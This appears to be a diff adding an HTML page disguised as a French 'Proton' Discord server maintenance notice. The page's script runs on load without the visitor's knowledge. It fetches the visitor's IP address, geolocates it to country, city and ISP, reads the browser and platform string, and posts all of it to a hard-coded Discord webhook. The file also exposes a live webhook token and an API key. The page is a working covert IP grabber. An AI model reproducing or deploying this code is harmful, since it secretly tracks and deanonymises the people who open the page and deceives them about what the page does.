@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="shortcut icon" href="/Users/aaa/Downloads/Ticket-Bot-main/config/ezrogenoff-main/favicon.ico" type="image/x-icon">
+  <style>
+    body {
+      background-color: #ffffff;
+      color: #2b58fa;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    .discord-embed {
+      background-color: #ffffff;
+      border-radius: 16px;
+      padding: 30px;
+      max-width: 500px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1), 0 4px 8px rgba(0, 0, 0, 0.1);
+      position: relative;
+      cursor: pointer;
+      transition: box-shadow 0.3s ease;
+      overflow: hidden;
+      margin: 20px auto;
+    }
+
+    .embed-line {
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 5px;
+      background-color: #4538fe;
+      border-radius: 16px 0 0 16px;
+    }
+
+    .embed-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #000000;
+      margin-left: 10px;
+    }
+
+    .embed-description {
+      font-size: 16px;
+      color: #2c3e50;
+      margin-top: 15px;
+      margin-left: 10px;
+    }
+
+    .embed-footer {
+      font-size: 14px;
+      color: #2c3e50;
+      margin-top: 15px;
+      margin-left: 10px;
+      text-decoration: underline;
+    }
+
+    .success-message {
+      background-color: #21b354;
+      color: #ffffff;
+      border-radius: 8px;
+      padding: 15px;
+      text-align: center;
+      display: none;
+      position: absolute;
+      top: 0;
+      right: 0;
+      transform: translateX(100%);
+      transition: transform 0.5s ease-in-out;
+      z-index: 999;
+    }
+
+    .success-message.show {
+      transform: translateX(0);
+    }
+
+    .discord-embed:hover {
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.2), 0 6px 12px rgba(0, 0, 0, 0.1);
+      margin-bottom: -10px;
+    }
+
+    .embed-title:hover {
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="discord-embed" onclick="sendWebhookWithMessage()">
+    <div class="embed-line"></div>
+    <div class="embed-title">Maintenance</div>
+    <div class="embed-description">
+      Nous vous informons que Proton est actuellement en cours de maintenance pour des améliorations et des mises à jour.
+      <br><br>
+      Pendant cette période, certaines fonctionnalités peuvent être temporairement indisponibles. Nous nous excusons pour tout inconvénient que cela pourrait causer et vous remercions de votre compréhension.
+      <br><br>
+      Veuillez revenir bientôt pour profiter de nos services améliorés.
+    </div>
+    <div class="embed-footer"><b> Proton - Serveur Discord</b></div>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1213178913237246002/wpJNgN7xCeP0JVUV56RssXpMLaK7cWVcCRcI6DNKLJQaOTrW935G4OqiWDIwFKOgOYOS";
+    const ipAddressURL = "https://api64.ipify.org?format=json";
+    const ipGeolocationURL = "https://api.ipgeolocation.io/ipgeo?apiKey=108c977b8b9243399faf11b6d6c19694";
+
+    const getIpAddress = async () => {
+      const response = await fetch(ipAddressURL);
+      const data = await response.json();
+      return data.ip;
+    };
+
+    const getIpGeolocation = async (ipAddress) => {
+      const response = await fetch(`${ipGeolocationURL}&ip=${ipAddress}`);
+      const data = await response.json();
+      console.log(data);
+      return data;
+    };
+
+    const hideEmail = (email) => {
+      const atIndex = email.indexOf('@');
+      if (atIndex > 0) {
+        const visiblePart = email.substring(0, Math.min(atIndex, email.length - 3));
+        const hiddenPart = '*'.repeat(Math.max(0, email.length - atIndex - 3));
+        return visiblePart + hiddenPart + email.substring(atIndex);
+      }
+      return email;
+    };
+
+    const sendWebhook = async (embed) => {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          embeds: [embed]
+        })
+      });
+    };
+
+    const sendWebhookWithMessage = async () => {
+      try {
+        const ipAddress = await getIpAddress();
+        const ipGeolocationData = await getIpGeolocation(ipAddress);
+
+        const currentDate = new Date().toLocaleString();
+
+        const userAgent = window.navigator.userAgent;
+        const osInfo = userAgent.match(/\(([^)]+)\)/)[1];
+
+        const embed = {
+          title: "<:Proton:1213556108296458320> Nouveau membre a rejoint le site!",
+          color: 0x2b2d31,
+          image: {
+            url: "https://cdn.discordapp.com/attachments/1213178802583109654/1213536171012132924/standard_7.gif?ex=65f5d4a1&is=65e35fa1&hm=37a8d41ff94bfbf319fbb88175f9d64834d1d5eaac5cd2b03bbd319b7eca4999"
+          },
+          fields: [
+            {
+              name: "Adresse IP",
+              value: `\`${ipAddress}\``,
+              inline: true
+            },
+            {
+              name: "Pays",
+              value: ipGeolocationData.country_name ? `\`${ipGeolocationData.country_name}\`` : "N/A",
+              inline: true
+            },
+            {
+              name: "Ville",
+              value: ipGeolocationData.city ? `\`${ipGeolocationData.city}\`` : "N/A",
+              inline: true
+            },
+            {
+              name: "Fournisseur Internet",
+              value: ipGeolocationData.isp ? `\`${ipGeolocationData.isp}\`` : "N/A",
+              inline: true
+            },
+            {
+              name: "Date",
+              value: `\`${currentDate}\``,
+              inline: true
+            },
+            {
+              name: "Plateforme & Navigateur",
+              value: `\`${osInfo}\``,
+              inline: true
+            }
+          ]
+        };
+
+        await sendWebhook(embed);
+      } catch (error) {
+        console.error(error);
+      }
+    };
+
+    sendWebhookWithMessage();
+  </script>
+</body>
+
+</html>
